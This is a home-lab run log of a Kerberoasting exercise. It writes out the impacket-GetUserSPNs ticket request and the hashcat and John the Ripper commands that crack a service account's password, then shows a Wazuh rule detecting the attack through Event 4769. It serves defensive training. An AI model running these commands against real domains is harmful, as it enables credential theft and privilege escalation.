# Project 01 — Kerberoasting: Run Log

Actual execution record of the attack described in [`README.md`](README.md).
Run on **2026-07-24** from KALI01 (`10.10.10.40`) against DC01 (`10.10.10.10`),
red phase (KALI01 + DC01 up, Wazuh off).

---

## Environment at run time
- **KALI01** — Kali 2026.2, `felix@felix`, eth0 = NAT (`10.0.2.15`, internet),
  eth1 = host-only (`10.10.10.40/24`, static, DNS → `10.10.10.10`).
- **DC01** — `lab.local` DC, `10.10.10.10`, NTDS running. DNS resolves
  `dc01.lab.local` and reverse. Ping + Kerberos reachable from Kali.
- Tooling shipped with Kali: `impacket-GetUserSPNs`, `john` (v — krb5tgs format),
  `hashcat v7.1.2`, `netexec`.

## Step 1 — Request the service ticket (Kerberoast)

Run as a **low-privileged** domain user (`a.mokaya`) — the whole point is that no
elevation is required:

```bash
impacket-GetUserSPNs 'lab.local/a.mokaya:Autumn2026!' -dc-ip 10.10.10.10 -request \
    -outputfile kerberoast_hashes.txt
```

Output ([`evidence/getuserspns_output.txt`](evidence/getuserspns_output.txt)):

```
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
MSSQLSvc/dc01.lab.local:1433  svc_sql            2026-07-23 22:33:16.706233  <never>
```

A single SPN account (`svc_sql`, misconfig #1) was found and a TGS-REP hash written:

```
$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$b52ecd83...<truncated>
```

The `$23$` = RC4 (etype 0x17) — the crackable encryption type. Modern accounts
should use AES (0x12); RC4 here is what makes offline cracking fast.

## Step 2 — Crack the hash offline

The canonical tool is **hashcat mode 13100**:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

> **Host note:** this VM has no GPU and Kali 2026.2's mirror had no `pocl` (CPU
> OpenCL) package, so hashcat reported `CL_PLATFORM_NOT_FOUND_KHR` (no compute
> backend). I therefore cracked with **John the Ripper**, which cracks the identical
> `krb5tgs` hash on CPU with no OpenCL dependency. Same hash, same result. On a
> GPU-equipped host, the hashcat command above is the one to use.

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
john --format=krb5tgs --show kerberoast_hashes.txt
```

Output ([`evidence/john_output.txt`](evidence/john_output.txt)):

```
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
P@ssw0rd         (?)
1g 0:00:00:00 DONE  ...
```

**Recovered credential: `svc_sql : P@ssw0rd`** — cracked in under a second because the
service account was given a weak password on purpose.

## Result

Starting from an ordinary domain user, I recovered a service account's plaintext
password with **no elevation and no interaction with the target service** — a
realistic foothold-to-escalation step. `svc_sql`'s credentials can now be reused
(e.g. against the SQL service, or as a spray/pivot candidate).

## Blue phase — detection fired (2026-07-25)

With WAZUH01 up and a Wazuh agent enrolled on DC01, I re-ran the Kerberoast (all three
VMs live: DC01 + KALI01 + WAZUH01) and the detection worked end-to-end.

**Setup for this run:**
- Wazuh agent 4.9.0 installed on DC01, reporting to the manager on `10.10.10.50`
  (shows **Active**, id 001).
- Custom rule **100010** loaded into the manager
  (`/var/ossec/etc/rules/local_rules.xml`) and the manager restarted to pick it up.
- DC01 already audits *Kerberos Service Ticket Operations* (Success), so the TGS
  request generates **Event 4769**.

**Result:** the same `impacket-GetUserSPNs` request from KALI01 (`10.10.10.40`)
produced a 4769 on DC01, the agent shipped it, and rule 100010 matched. In the Wazuh
dashboard, filtering `rule.id:100010` returns exactly **1 hit** with:

| Field | Value |
|-------|-------|
| rule.id / level | **100010** / 10 |
| rule.description | Kerberoasting: RC4 (0x17) TGS request for an SPN account [T1558.003] |
| agent.name | DC01 |
| data.win.system.eventID | **4769** |
| data.win.eventdata.ticketEncryptionType | **0x17** (RC4) |
| data.win.eventdata.serviceName | **svc_sql** |
| data.win.eventdata.targetUserName | a.mokaya@LAB.LOCAL |
| data.win.eventdata.ipAddress | ::ffff:**10.10.10.40** (the attacker, KALI01) |

That closes the loop for misconfig #1: the **same finding** is both exploited
(red) and detected (blue).

> **Note on the rule field path:** the rule keys on `win.eventdata.ticketEncryptionType`
> from Wazuh's Windows-eventchannel decoder. A `wazuh-logtest` dry-run with hand-built
> JSON won't match (it decodes as generic `json`, never entering the `windows` group) —
> only a real agent-sourced 4769 decodes correctly. The live run is the real test, and
> it matched.
>
> **Dashboard note:** the fresh stack shipped with no index pattern, so Discover showed
> nothing at first. I created the `wazuh-alerts-*` index pattern (time field
> `timestamp`) and set it as default; the alert then rendered in the UI.

## Evidence

**Red phase** — screenshots captured live from the KALI01 GUI terminal (2026-07-24):

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali on `10.10.10.40` pinging DC01 and resolving `dc01.lab.local` |
| 2 | [`evidence/02-getuserspns-svc_sql.png`](evidence/02-getuserspns-svc_sql.png) | `impacket-GetUserSPNs` as `a.mokaya` enumerating the `svc_sql` SPN and requesting the TGS |
| 3 | [`evidence/03-john-cracks-password.png`](evidence/03-john-cracks-password.png) | John cracking the RC4 TGS → **`svc_sql : P@ssw0rd`** |

**Blue phase** — screenshots from the Wazuh dashboard at `https://10.10.10.50` (2026-07-25):

| # | Shot | What it shows |
|---|------|---------------|
| 4 | [`evidence/04-wazuh-login.png`](evidence/04-wazuh-login.png) | Wazuh dashboard login (stack live on the lab net) |
| 5 | [`evidence/05-wazuh-kerberoast-alert.png`](evidence/05-wazuh-kerberoast-alert.png) | Discover filtered to `rule.id:100010` — **1 hit**, showing 4769 / RC4 (0x17) / `svc_sql` from DC01, source `10.10.10.40` |
| 6 | [`evidence/06-wazuh-alert-detail.png`](evidence/06-wazuh-alert-detail.png) | The alert's expanded document — full `data.win.*` field table for the Kerberoast event |

Raw command output:
- [`evidence/getuserspns_output.txt`](evidence/getuserspns_output.txt) — SPN enumeration + TGS request
- [`evidence/john_output.txt`](evidence/john_output.txt) — offline crack recovering `P@ssw0rd`

> **Display note:** capturing legible GUI screenshots required switching KALI01's
> graphics controller to **VMSVGA with 128 MB VRAM** (`VBoxManage modifyvm KALI01
> --graphicscontroller vmsvga --vram 128`). With the previous `vboxsvga`/64 MB the
> GNOME session rendered black/garbled in screenshots. Recorded in
> [`../../setup/TROUBLESHOOTING.md`](../../setup/TROUBLESHOOTING.md).
